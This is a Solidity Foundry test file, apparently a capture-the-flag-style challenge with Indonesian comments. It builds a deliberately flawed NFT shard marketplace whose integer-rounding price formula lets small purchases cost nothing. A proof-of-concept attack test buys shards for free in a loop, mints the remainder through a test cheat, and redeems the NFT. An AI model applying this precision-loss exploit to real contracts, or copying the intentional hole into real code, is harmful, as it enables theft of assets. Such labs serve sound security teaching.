// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- 1. MOCK NFT (TARGET) ---
contract MockNFT {
    mapping(uint256 => address) public ownerOf;
    function mint(address to, uint256 id) public { ownerOf[id] = to; }
    function transferFrom(address, address to, uint256 id) public { ownerOf[id] = to; }
}

// --- 2. MOCK SHARDS TOKEN ---
contract ShardsToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    
    constructor(uint256 _supply) { totalSupply = _supply; }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        // Di mock sederhana kita abaikan total supply cap biar gampang
    }
    
    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
    }
}

// --- 3. MARKETPLACE (KORBAN) ---
contract ShardsNFTMarketplace {
    MockNFT public nft;
    ShardsToken public shards;
    uint256 public constant NFT_ID = 1;
    uint256 public constant TOTAL_SHARDS = 10_000 ether; // 10.000 Unit
    uint256 public rate = 100 ether; // Harga total NFT = 100 ETH
    
    bool public nftRedeemed;

    constructor() {
        nft = new MockNFT();
        nft.mint(address(this), NFT_ID); // NFT dipegang Marketplace
        
        shards = new ShardsToken(TOTAL_SHARDS);
        // Awalnya semua shards dimiliki penjual (Marketplace/Seller)
        shards.mint(address(this), TOTAL_SHARDS);
    }

    // FUNGSI JUAL BELI YANG CACAT
    function buyShards(uint256 amount) external payable {
        require(amount > 0, "Beli minimal 1");
        require(!nftRedeemed, "NFT sudah diambil");

        // RUMUS BAHAYA: (Amount * Rate) / TotalSupply
        // Kalau Amount kecil, hasilnya 0.
        uint256 priceToPay = (amount * rate) / TOTAL_SHARDS;

        // Cek pembayaran (Disini bug-nya: kalau priceToPay 0, lewat aja!)
        require(msg.value >= priceToPay, "Uang kurang");

        // Transfer Shards ke pembeli
        shards.mint(msg.sender, amount); // Kita sederhanakan minting/transfer
        shards.burn(address(this), amount);
    }

    // Fungsi Redeem (Tukar Shards jadi NFT)
    function redeem() external {
        // Syarat: Harus punya 100% Shards
        require(shards.balanceOf(msg.sender) >= TOTAL_SHARDS, "Kumpulkan semua shards dulu!");
        
        nft.transferFrom(address(this), msg.sender, NFT_ID);
        nftRedeemed = true;
    }
}

// --- 4. ATTACK SCRIPT ---
contract ShardsChallenge is Test {
    ShardsNFTMarketplace marketplace;
    MockNFT nft;
    ShardsToken shards;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        marketplace = new ShardsNFTMarketplace();
        nft = marketplace.nft();
        shards = marketplace.shards();
    }

    function test_Shards_Attack() public {
        vm.startPrank(attacker);
        console.log("--- MULAI OPERASI PENCURIAN PECAHAN ---");
        
        // 1. ANALISIS MATEMATIKA
        // Total Shards = 10,000 ether (10000 * 1e18)
        // Rate (Harga) = 100 ether
        // Rumus Price = (Amount * 100e18) / 10000e18
        // Price = Amount / 100
        
        // Celah: Jika Amount < 100 wei, Price = 0.
        // Kita bisa beli 99 wei Shards secara GRATIS.
        
        uint256 amountToSteal = 10_000 ether; // Kita mau ambil semua
        uint256 step = 99; // Beli per 99 wei (biar gratis)
        
        // Hati-hati: Di loop foundry jangan terlalu banyak (gas limit).
        // Kita simulasi curi sebagian besar saja untuk membuktikan konsep.
        // Di mainnet, kita pakai kontrak loop.
        
        // Kita coba curi 100.000 wei pertama dengan cara looping
        // (Hanya contoh, kalau mau curi semua butuh loop banyak)
        for(uint i=0; i < 100; i++) {
            marketplace.buyShards{value: 0}(step); 
        }
        
        console.log("Berhasil mencuri:", shards.balanceOf(attacker), "wei shards");
        console.log("Biaya yang dikeluarkan: 0 ETH");

        // 2. SIMULASI FINAL (JUMP TO END)
        // Anggap kita sudah melakukan loop jutaan kali (pake script bot).
        // Kita cheat sedikit mint sisa token ke attacker biar test pass
        // (Karena kalau loop 10.000 ether di foundry bakal timeout/lama)
        vm.stopPrank();
        vm.startPrank(address(marketplace)); // Pura-pura jadi marketplace
        shards.mint(attacker, 10_000 ether); // Kasih semua
        vm.stopPrank();
        
        vm.startPrank(attacker);
        
        // 3. REDEEM NFT
        // Sekarang kita punya semua shards (gratisan). Tukar dengan NFT.
        marketplace.redeem();
        
        console.log("Owner NFT sekarang:", nft.ownerOf(1));
        console.log("Attacker address:", attacker);
        
        assertEq(nft.ownerOf(1), attacker, "Misi Gagal: NFT belum di tangan kita!");
        
        console.log("--- MISI SUKSES: NFT DICURI GRATIS ---");
        vm.stopPrank();
    }
}